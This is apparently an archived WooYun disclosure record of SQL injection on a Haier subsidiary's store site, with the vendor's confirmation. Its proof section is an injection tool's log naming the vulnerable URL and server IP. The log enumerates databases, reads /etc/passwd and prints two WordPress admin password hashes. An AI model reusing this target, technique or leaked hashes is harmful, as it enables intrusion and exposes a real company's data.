{"id": 38911, "wybug_id": "wooyun-2015-095196", "wybug_title": "海尔旗下日日顺某站sql注入导致疑似后台密码泄露", "wybug_corp": "海尔集团", "wybug_author": "雅柏菲卡", "wybug_date": "2015-02-02 15:46", "wybug_open_date": "2015-03-19 15:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向公众公开  简要描述： ............ 详细说明：  ......   漏洞证明：  \n......把胡萝卜的运行日志贴出来Target: \t\thttp://store.rrs.com/experience-store/ajaxJsp/experience_store.jsp?postType=getExperienceStore&shopId=3Host IP:\t\t60.211.209.144Web Server: \tnginx/1.7.0DB Server: \tMySQLResp. Time(avg):\t93 msCurrent User: \ttony@120.27.45.4Current DB: \texperience_storeSystem User: \ttony@120.27.45.4Compile OS: \tLinuxDB User: \t'tony'@'%'Data Bases: \tinformation_schemaSql Version: \t5.5.18.1-log\t\tactivity\t\tbrandcoupon\t\texperience_store\t\tmysql\t\tperformance_schema\t\tstore\t\twaterHost IP: 60.211.209.144Web Server: nginx/1.7.0Can not find keyword but let me do a try!I guess injection type is Integer?! If injection failed, retry with a manual keyword.Can't find db server type! But maybe there be some chances! [-o<Finding columns count(MySQL,MsSQL 2005): 10Error (10060): The attempt to connect timed outTurning on mod_security bypassFinding columns count(MySQL,MsSQL 2005): 2Error (10060): The attempt to connect timed outSelected Column Count is 10Valid String Column is 1DB Server: MySQLCurrent DB: experience_storeCurrent User: \ttony@120.27.45.4Current DB: \texperience_storeSystem User: \ttony@120.27.45.4Compile OS: \tLinuxDb user: 'tony'@'%'Data Base Found: information_schemaSql Version: \t5.5.18.1-logData Base Found: activityData Base Found: brandcouponData Base Found: experience_storeData Base Found: mysqlData Base Found: performance_schemaData Base Found: storeData Base Found: waterCount(table_name) of information_schema.tables where table_schema=0x6272616E64636F75706F6E is 5Error (10060): The attempt to connect timed outCan not get all tables by group_concat!Count(table_name) of information_schema.tables where table_schema=0x6272616E64636F75706F6E is 5Table found: activityTable found: articleTable found: article_picTable found: our_articleTable found: phoneCount(column_name) of information_schema.columns where table_schema=0x6272616E64636F75706F6E and table_name=0x70686F6E65 is 3Column found: idColumn found: phoneColumn found: operatetimeCount(table_name) of information_schema.tables where table_schema=0x73746F7265 is 0Bypassing illegal union failed! Turning off this featureIt seems information_schema table does not exist! Trying to guess tables!Guessing table(66/686): tbl_tbadminCanceling...Total tables found: 0Job Canceled!Count(table_name) of information_schema.tables where table_schema=0x7761746572 is 11Table found: wp_commentmetaTable found: wp_commentsTable found: wp_postmetaTable found: wp_linksTable found: wp_postsTable found: wp_term_relationshipsTable found: wp_term_taxonomyTable found: wp_termsTable found: wp_usersTable found: wp_optionsReading file: /etc/passwdFile was readCount(column_name) of information_schema.columns where table_schema=0x7761746572 and table_name=0x77705F7573657273 is 10Column found: IDColumn found: user_loginColumn found: user_passColumn found: user_nicenameColumn found: user_urlColumn found: user_registeredColumn found: user_activation_keyColumn found: user_statusColumn found: display_nameColumn found: user_emailCount(*) of water.wp_users is 2Data Found: user_login,user_pass=admin^$P$BlURguHDipQnbzCt84KEOhoF1DOtwA/Data Found: user_login,user_pass=qilin^$P$Bm5AvyG0lQ.8dVSFsPoMBi7r64NrjV1\n   修复方案：  ..........   版权声明：转载请注明来源 雅柏菲卡@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-02-04 14:47 厂商回复： 感谢您的测试与提醒，我方已安排人员进行处理！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}